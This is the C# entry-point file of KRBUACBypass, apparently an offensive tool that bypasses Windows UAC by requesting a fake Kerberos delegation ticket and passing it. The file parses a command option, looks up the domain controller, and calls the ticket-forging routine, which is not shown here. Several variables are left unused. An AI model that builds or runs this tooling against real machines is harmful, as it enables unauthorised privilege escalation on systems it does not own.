using System;
using System.Net;
using CommandLine;
using CommandLine.Text;
using KRBUACBypass.lib.Interop;
using System.Collections.Generic;

namespace KRBUACBypass
{
    public class Options
    {
        [Option('c', "Command", Required = false, HelpText = "Program to run.")]
        public string Command { get; set; }

        [Option('v', "Verbose", Required = false, HelpText = "Output verbose debug information.")]
        public bool Verbose { get; set; }
    }

    internal class Program
    {
        public static bool wrapTickets = false;
        public static bool Debug = false;
        public static bool Verbose = true;
        public static bool BogusMachineID = true;
        static void Main(string[] args)
        {
            var ParserResult = new CommandLine.Parser(with => with.HelpWriter = null)
                .ParseArguments<Options>(args);

            ParserResult
                .WithParsed(options => Run(args, options))
                .WithNotParsed(errs => DisplayHelp(ParserResult));
        }

        static void DisplayHelp<T>(ParserResult<T> result)
        {
            var helpText = HelpText.AutoBuild(result, h =>
            {
                h.AdditionalNewLineAfterOption = false;
                h.MaximumDisplayWidth = 100;
                h.Heading = "\nKRBUACBypass 1.0.0-beta"; //change header
                h.Copyright = "Copyright (c) 2023"; //change copyright text
                return HelpText.DefaultParsingErrorsHandler(result, h);
            }, e => e);
            Console.WriteLine(helpText);
        }

        private static void Run(string[] args, Options options)
        {
            string command = options.Command;
            Verbose = options.Verbose;

            string domainController = Networking.GetDCName();
            string service = $"HOST/{Dns.GetHostName()}";
            Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial;
            string outfile = "";
            bool ptt = true;

            byte[] blah = LSA.RequestFakeDelegTicket();
        }
    }
}
